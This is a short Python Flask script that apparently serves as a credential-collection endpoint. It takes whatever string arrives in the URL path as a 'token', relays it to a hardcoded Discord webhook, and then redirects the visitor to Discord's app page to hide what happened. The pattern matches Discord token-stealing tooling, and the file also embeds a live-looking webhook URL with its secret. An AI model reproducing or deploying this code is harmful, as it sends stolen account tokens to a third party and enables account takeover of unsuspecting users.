from dhooks import Webhook
from flask import Flask, redirect
e = "https://discord.com/api/webhooks/1413240554581524510/wGgP0zML6lzDt0y8c4_qUOy1ZCR6GljYXbdgZPOxw3kLGI_5jNV2yx0ifA-2r5qe-JYZ"
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  hook.send(token)
  return redirect("https://discord.com/app")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
